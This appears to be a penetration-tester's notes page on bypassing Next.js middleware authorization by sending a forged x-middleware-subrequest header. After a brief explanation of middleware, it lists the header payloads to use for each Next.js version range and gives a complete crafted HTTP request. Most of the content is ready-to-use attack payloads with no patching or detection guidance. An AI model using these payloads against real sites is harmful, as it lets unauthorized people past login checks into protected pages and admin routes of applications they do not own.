---
icon: midi
---

# Middleware Byepass

### The Next.js Middleware

Next.js middleware is a powerful feature that allows developers to run code before a request is completed. As the official Next.js documentation states: "Middleware allows you to run code before a request is completed. Then, based on the incoming request, you can modify the response by rewriting, redirecting, modifying the request or response headers, or responding directly."The middleware functionality in Next.js has numerous use cases, but the most critical ones include:

1. **Path rewriting** - Dynamically changing the requested path before it reaches the application logic
2. **Server-side redirects** - Redirecting users based on certain conditions
3. **Adding response headers** - Including security headers like Content Security Policy (CSP)
4. **Authentication and Authorization** - Ensuring user identity and checking session cookies before granting access to specific pages or API routes

> common implementation pattern is using middleware for authorization, which involves protecting certain paths based on specific conditions. For example, when a user attempts to access a protected route like `/dashboard/admin`, the middleware intercepts the request, checks if the user's session cookies are valid and if they have the necessary permissions. If the conditions are met, the middleware forwards the request; otherwise, it redirects the user to a login page.

**For versions prior to 12.2:**

In these versions, middleware files had to be named `_middleware.ts` and placed inside the `pages` folder. The value of `middlewareInfo.name` was composed of the directory name and the file name:

```c
x-middleware-subrequest: pages/_middleware
```

For nested routes, there could be multiple middleware files at different levels, resulting in multiple possible values for the header:

```c
x-middleware-subrequest: pages/dashboard/_middleware
```

or

```c
x-middleware-subrequest: pages/dashboard/panel/_middleware
```

**For versions 12.2 and later:**

Starting with version 12.2, Next.js changed the middleware conventions. The file should be named `middleware.ts` (without the underscore) and should no longer be located in the pages folder. For these versions, the payload is simpler:

```c
x-middleware-subrequest: middleware
```

Additionally, Next.js allows for an alternative project structure with a `/src` directory. In such cases, the payload would be:

```c
x-middleware-subrequest: src/middleware
```

**For versions 13.2.0 and later:**

For versions 13.2.0 and above, Next.js introduced a maximum recursion depth for middleware execution. This was implemented to prevent infinite loops but doesn't affect the vulnerability. The exploitation remains the same, as the header check occurs before any recursion depth checks.

```c
x-middleware-subrequest: middleware:middleware:middleware:middleware:middleware
```

Alternatively, for projects using a `/src` directory structure:

```bash
x-middleware-subrequest: src/middleware:src/middleware:src/middleware:src/middle
```

request will look something like that

```c
GET /docs/examples HTTP/1.1
X-Middleware-Subrequest: src/middleware:nowaf:src/middleware:src/middleware:src/middleware:src/middleware:middleware:middleware:nowaf:middleware:middleware:middleware:pages/_middleware
Host: 10.10.0.0
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:142.0) Gecko/20100101 Firefox/142.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
x-nextjs-data: 0
Cookie: next-auth.csrf-token=806b1b7ffae716e9e9cede80a876c3b79a1883b660a4ae2a385d1e44b5636790%7C6e7ea2a2e662b728979b1bce2520e6cf7dce22457fbf08a439c1a3414d5d1111; next-auth.callback-url=http%3A%2F%2Flocalhost%3A3000
```
